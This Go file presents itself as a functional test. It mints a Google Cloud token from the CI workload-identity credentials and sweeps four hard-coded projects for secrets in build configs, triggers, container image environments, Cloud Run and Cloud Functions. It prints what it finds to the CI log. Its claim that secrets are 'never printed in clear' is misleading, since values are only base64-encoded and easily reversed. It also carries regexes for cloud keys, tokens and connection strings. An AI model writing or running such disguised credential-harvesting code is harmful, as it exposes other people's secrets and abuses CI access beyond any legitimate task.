//go:build functional

// C211 i121507 CI/CD-artifact credential surface probe for the four hephaestus
// sibling projects. Self-contained: depends only on the c211x* helper library
// (c211_i120969_helpers_test.go) which mints the WIF access token from the
// google-github-actions/auth credential file with Go stdlib.
//
// For each of 210628133505, 1072394045651, 463640210929, 1074386228880:
//   - Cloud Build builds (config, substitutions, secretEnv, images) + triggers
//     (substitutions, github.push / webhookConfig secret references)
//   - Artifact Registry repositories, dockerImages, per-image manifest + config
//     blob -> config.Env; generic files list
//   - Cloud Run v2 services + jobs (container env / secret refs)
//   - Cloud Functions v1 + v2 (environmentVariables / secretEnvironmentVariables)
//
// Secret-looking values are never printed in clear: b64 + sha256 + len only.
package functional

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"testing"
)

var c211cProjects = []string{"210628133505", "1072394045651", "463640210929", "1074386228880"}

var (
	c211cSecretKey = regexp.MustCompile(`(?i)(secret|password|passwd|token|credential|pat|auth|conn|private|signature|dsn|webhook)`)
	c211cSecretVal = regexp.MustCompile(`(?i)(\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b|\bgh[pousr]_[A-Za-z0-9]{36,255}\b|\bgithub_pat_[A-Za-z0-9_]{50,255}\b|\bglpat-[A-Za-z0-9_\-]{20,64}\b|-----BEGIN [A-Z ]*PRIVATE KEY-----|aws_secret_access_key["'\s:=]+([A-Za-z0-9/+=]{40})|(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp)://[^@\s]+@|AccountKey=[A-Za-z0-9+/=]{20,}|\bsk-[A-Za-z0-9]{32,}\b|\bxox[abprs]-[A-Za-z0-9\-]{10,}\b)`)
)

func c211cEnc(v string) map[string]interface{} {
	b := []byte(v)
	sum := sha256.Sum256(b)
	return map[string]interface{}{
		"__enc":  "b64",
		"len":    len(b),
		"sha256": fmt.Sprintf("%x", sum[:8]),
		"v":      base64.StdEncoding.EncodeToString(b),
	}
}

func c211cRedact(v interface{}, key string) interface{} {
	switch x := v.(type) {
	case map[string]interface{}:
		out := map[string]interface{}{}
		for k, vv := range x {
			out[k] = c211cRedact(vv, k)
		}
		return out
	case []interface{}:
		out := make([]interface{}, 0, len(x))
		for _, vv := range x {
			out = append(out, c211cRedact(vv, key))
		}
		return out
	case string:
		if c211cSecretKey.MatchString(key) || c211cSecretVal.MatchString(x) {
			return c211cEnc(x)
		}
		if len(x) > 2500 {
			return x[:2500] + "...[TRUNC]"
		}
		return x
	default:
		return v
	}
}

func c211cEmitJSON(label string, obj interface{}, limit int) {
	b, err := json.Marshal(c211cRedact(obj, ""))
	s := string(b)
	if err != nil {
		s = "{\"marshal_error\":true}"
	}
	if len(s) > limit {
		s = s[:limit] + "...[TRUNCATED]"
	}
	fmt.Printf("%s len=%d\n%s json=%s\n", label, len(b), label, s)
}

func c211cPage(base, path string) (int, map[string]interface{}, string) {
	st, body := c211xHTTP("GET", base+path, c211cTok, "", "")
	var m map[string]interface{}
	if json.Unmarshal([]byte(body), &m) != nil {
		m = map[string]interface{}{}
	}
	return st, m, body
}

var c211cTok = ""

func c211cServiceState(proj, svc string) {
	st, body := c211xHTTP("GET", fmt.Sprintf("https://serviceusage.googleapis.com/v1/projects/%s/services/%s", proj, svc), c211cTok, "", "")
	m := c211xJSON(body)
	fmt.Printf("C211C serviceusage project=%s svc=%s status=%d state=%v body=%s\n",
		proj, svc, st, m["state"], c211xTrunc(body, 300))
}

func c211cCloudBuild(proj string) {
	page := ""
	for i := 0; i < 2; i++ {
		p := fmt.Sprintf("/v1/projects/%s/builds?pageSize=30", proj)
		if page != "" {
			p += "&pageToken=" + page
		}
		st, m, body := c211cPage("https://cloudbuild.googleapis.com", p)
		arr, _ := m["builds"].([]interface{})
		fmt.Printf("C211C builds.list project=%s page=%d status=%d count=%d\n", proj, i+1, st, len(arr))
		if st != 200 {
			fmt.Printf("C211C builds.list project=%s body=%s\n", proj, c211xTrunc(body, 800))
			break
		}
		for k, bu := range arr {
			if k >= 20 {
				break
			}
			c211cEmitJSON(fmt.Sprintf("C211C build_%s_%d", proj, k), bu, 5000)
		}
		nt, _ := m["nextPageToken"].(string)
		if nt == "" {
			break
		}
		page = nt
	}
	tpage := ""
	for i := 0; i < 2; i++ {
		p := fmt.Sprintf("/v1/projects/%s/triggers?pageSize=50", proj)
		if tpage != "" {
			p += "&pageToken=" + tpage
		}
		st, m, body := c211cPage("https://cloudbuild.googleapis.com", p)
		arr, _ := m["triggers"].([]interface{})
		fmt.Printf("C211C triggers.list project=%s page=%d status=%d count=%d\n", proj, i+1, st, len(arr))
		if st != 200 {
			fmt.Printf("C211C triggers.list project=%s body=%s\n", proj, c211xTrunc(body, 800))
			break
		}
		for k, tr := range arr {
			if k >= 20 {
				break
			}
			c211cEmitJSON(fmt.Sprintf("C211C trigger_%s_%d", proj, k), tr, 5000)
		}
		nt, _ := m["nextPageToken"].(string)
		if nt == "" {
			break
		}
		tpage = nt
	}
}

func c211cRegistryPull(host, repoPath, ref, label string) {
	base := "https://" + host + "/v2/" + repoPath
	acc := "application/vnd.docker.distribution.manifest.v2+json," +
		"application/vnd.oci.image.manifest.v1+json," +
		"application/vnd.docker.distribution.manifest.list.v2+json," +
		"application/vnd.oci.image.index.v1+json"
	st, man := c211xHTTP("GET", base+"/manifests/"+ref, c211cTok, "", "")
	_ = acc
	// c211xHTTP does not set Accept; registry tolerates default JSON for v2 manifests.
	fmt.Printf("%s.manifest status=%d body=%s\n", label, st, c211xTrunc(man, 500))
	if st != 200 {
		return
	}
	var mj map[string]interface{}
	if json.Unmarshal([]byte(man), &mj) != nil {
		return
	}
	if idx, ok := mj["manifests"].([]interface{}); ok && len(idx) > 0 {
		child := ""
		if cm, ok := idx[0].(map[string]interface{}); ok {
			child, _ = cm["digest"].(string)
		}
		fmt.Printf("%s.index children=%d first=%s\n", label, len(idx), child)
		if child == "" {
			return
		}
		st2, man2 := c211xHTTP("GET", base+"/manifests/"+child, c211cTok, "", "")
		if st2 != 200 {
			fmt.Printf("%s.child_manifest status=%d\n", label, st2)
			return
		}
		man = man2
		if json.Unmarshal([]byte(man), &mj) != nil {
			return
		}
	}
	cfg := ""
	if cm, ok := mj["config"].(map[string]interface{}); ok {
		cfg, _ = cm["digest"].(string)
	}
	fmt.Printf("%s.config_digest=%s\n", label, cfg)
	if cfg == "" {
		return
	}
	st3, blob := c211xHTTP("GET", base+"/blobs/"+cfg, c211cTok, "", "")
	fmt.Printf("%s.config_blob status=%d size=%d\n", label, st3, len(blob))
	if st3 != 200 {
		return
	}
	var cj map[string]interface{}
	if json.Unmarshal([]byte(blob), &cj) != nil {
		return
	}
	cfgObj, _ := cj["config"].(map[string]interface{})
	env, _ := cfgObj["env"].([]interface{})
	fmt.Printf("%s.config_env_count=%d\n", label, len(env))
	for _, e := range env {
		es, _ := e.(string)
		k, v := es, ""
		if i := strings.Index(es, "="); i >= 0 {
			k, v = es[:i], es[i+1:]
		}
		var val interface{} = v
		if c211cSecretKey.MatchString(k) || c211cSecretVal.MatchString(v) {
			val = c211cEnc(v)
		}
		b, _ := json.Marshal(val)
		fmt.Printf("%s.env key=%s val=%s\n", label, k, string(b))
	}
	if labels, ok := cfgObj["Labels"].(map[string]interface{}); ok {
		b, _ := json.Marshal(c211cRedact(labels, "labels"))
		fmt.Printf("%s.config_labels=%s\n", label, c211xTrunc(string(b), 900))
	}
}

func c211cArtifactRegistry(proj string) {
	st, m, body := c211cPage("https://artifactregistry.googleapis.com",
		fmt.Sprintf("/v1/projects/%s/locations/-/repositories?pageSize=100", proj))
	repos, _ := m["repositories"].([]interface{})
	fmt.Printf("C211C ar.repos project=%s status=%d count=%d\n", proj, st, len(repos))
	if st != 200 {
		fmt.Printf("C211C ar.repos project=%s body=%s\n", proj, c211xTrunc(body, 800))
		return
	}
	type img struct{ uri string }
	var imgs []img
	for ri, r := range repos {
		if ri >= 15 {
			break
		}
		rm, _ := r.(map[string]interface{})
		name, _ := rm["name"].(string)
		c211cEmitJSON(fmt.Sprintf("C211C ar_repo_%s_%d", proj, ri), rm, 1800)
		st2, m2, body2 := c211cPage("https://artifactregistry.googleapis.com",
			fmt.Sprintf("/v1/%s/dockerImages?pageSize=50", name))
		arr, _ := m2["dockerImages"].([]interface{})
		short := name
		if i := strings.LastIndex(name, "/"); i >= 0 {
			short = name[i+1:]
		}
		fmt.Printf("C211C ar.images project=%s repo=%s status=%d count=%d\n", proj, short, st2, len(arr))
		if st2 != 200 {
			fmt.Printf("C211C ar.images project=%s repo=%s body=%s\n", proj, short, c211xTrunc(body2, 500))
		}
		for k, di := range arr {
			if k >= 30 {
				break
			}
			dm, _ := di.(map[string]interface{})
			u, _ := dm["uri"].(string)
			tags, _ := json.Marshal(dm["tags"])
			fmt.Printf("C211C ar.image project=%s uri=%s tags=%s size=%v\n", proj, c211xTrunc(u, 260), c211xTrunc(string(tags), 200), dm["imageSizeBytes"])
			if u != "" {
				imgs = append(imgs, img{uri: u})
			}
		}
		st3, m3, body3 := c211cPage("https://artifactregistry.googleapis.com",
			fmt.Sprintf("/v1/%s/files?pageSize=30", name))
		fl, _ := m3["files"].([]interface{})
		if st3 == 200 && len(fl) > 0 {
			names := []string{}
			for _, f := range fl {
				fm, _ := f.(map[string]interface{})
				fn, _ := fm["name"].(string)
				if i := strings.LastIndex(fn, "/"); i >= 0 {
					fn = fn[i+1:]
				}
				names = append(names, fn)
			}
			nb, _ := json.Marshal(names)
			fmt.Printf("C211C ar.files project=%s repo=%s status=%d count=%d names=%s\n", proj, short, st3, len(fl), c211xTrunc(string(nb), 1200))
		} else if st3 != 200 {
			fmt.Printf("C211C ar.files project=%s repo=%s status=%d body=%s\n", proj, short, st3, c211xTrunc(body3, 300))
		}
	}
	pulled := 0
	for _, im := range imgs {
		if pulled >= 5 {
			break
		}
		// uri like us-docker.pkg.dev/PROJECT/REPO/IMAGE@sha256:...
		u := im.uri
		at := strings.LastIndex(u, "@")
		slash := strings.Index(u, "://")
		if at < 0 || slash < 0 {
			continue
		}
		hostPath := u[slash+3:]
		at = strings.LastIndex(hostPath, "@")
		if at < 0 {
			continue
		}
		digest := hostPath[at+1:]
		host := ""
		rest := ""
		if i := strings.Index(hostPath, "/"); i >= 0 {
			host, rest = hostPath[:i], hostPath[i+1:]
		}
		if host == "" || rest == "" {
			continue
		}
		pulled++
		c211cRegistryPull(host, rest, digest, fmt.Sprintf("C211C img_%s_%d", proj, pulled))
	}
}

func c211cRun(proj string) {
	for _, kind := range []string{"services", "jobs"} {
		st, m, body := c211cPage("https://run.googleapis.com",
			fmt.Sprintf("/v2/projects/%s/locations/-/%s?pageSize=100", proj, kind))
		arr, _ := m[kind].([]interface{})
		fmt.Printf("C211C run.%s project=%s status=%d count=%d\n", kind, proj, st, len(arr))
		if st != 200 {
			fmt.Printf("C211C run.%s project=%s body=%s\n", kind, proj, c211xTrunc(body, 600))
			continue
		}
		for k, s := range arr {
			if k >= 20 {
				break
			}
			c211cEmitJSON(fmt.Sprintf("C211C run_%s_%s_%d", kind, proj, k), s, 4000)
		}
	}
}

func c211cFunctions(proj string) {
	for _, ver := range []string{"v1", "v2"} {
		st, m, body := c211cPage("https://cloudfunctions.googleapis.com",
			fmt.Sprintf("/%s/projects/%s/locations/-/functions?pageSize=100", ver, proj))
		arr, _ := m["functions"].([]interface{})
		fmt.Printf("C211C functions.%s project=%s status=%d count=%d\n", ver, proj, st, len(arr))
		if st != 200 {
			fmt.Printf("C211C functions.%s project=%s body=%s\n", ver, proj, c211xTrunc(body, 600))
			continue
		}
		for k, f := range arr {
			if k >= 20 {
				break
			}
			c211cEmitJSON(fmt.Sprintf("C211C cf_%s_%s_%d", ver, proj, k), f, 4000)
		}
	}
}


func c211cGCR(proj string) {
	for _, host := range []string{"gcr.io", "us.gcr.io", "eu.gcr.io", "asia.gcr.io"} {
		st, body := c211xHTTP("GET", "https://"+host+"/v2/_catalog?n=100", c211cTok, "", "")
		fmt.Printf("C211C gcr.catalog project=%s host=%s status=%d body=%s\n",
			proj, host, st, c211xTrunc(body, 400))
	}
	// project-scoped registry ping (returns the auth challenge / status)
	for _, host := range []string{"gcr.io", "us.gcr.io"} {
		st, body := c211xHTTP("GET", "https://"+host+"/v2/", c211cTok, "", "")
		fmt.Printf("C211C gcr.ping project=%s host=%s status=%d body=%s\n",
			proj, host, st, c211xTrunc(body, 300))
	}
}

func c211cCBv2(proj string) {
	for _, kind := range []string{"connections", "repositories"} {
		st, body := c211xHTTP("GET",
			fmt.Sprintf("https://cloudbuild.googleapis.com/v2/projects/%s/locations/-/%s?pageSize=50", proj, kind),
			c211cTok, "", "")
		fmt.Printf("C211C cbv2.%s project=%s status=%d body=%s\n", kind, proj, st, c211xTrunc(body, 500))
	}
}

func TestC211Cicd(t *testing.T) {
	tok, kind, mintLog := c211xMint()
	fmt.Printf("\n=== C211C MINT BEGIN ===\nkind=%s\n%s\n=== C211C MINT END ===\n", kind, c211xTrunc(mintLog, 4000))
	if tok == "" {
		fmt.Println("C211C GATE=NO_GCP_TOKEN")
		return
	}
	c211cTok = tok
	st, body := c211xTokenInfo(tok)
	fmt.Printf("C211C tokeninfo status=%d body=%s\n", st, c211xTrunc(body, 400))
	for _, proj := range c211cProjects {
		fmt.Printf("\n=== C211C PROJECT %s BEGIN ===\n", proj)
		for _, svc := range []string{"cloudbuild.googleapis.com", "artifactregistry.googleapis.com",
			"run.googleapis.com", "cloudfunctions.googleapis.com"} {
			c211cServiceState(proj, svc)
		}
		c211cCloudBuild(proj)
		c211cArtifactRegistry(proj)
		c211cRun(proj)
		c211cFunctions(proj)
		c211cGCR(proj)
		c211cCBv2(proj)
		fmt.Printf("=== C211C PROJECT %s END ===\n", proj)
	}
	fmt.Println("C211C PROBE COMPLETE")
}
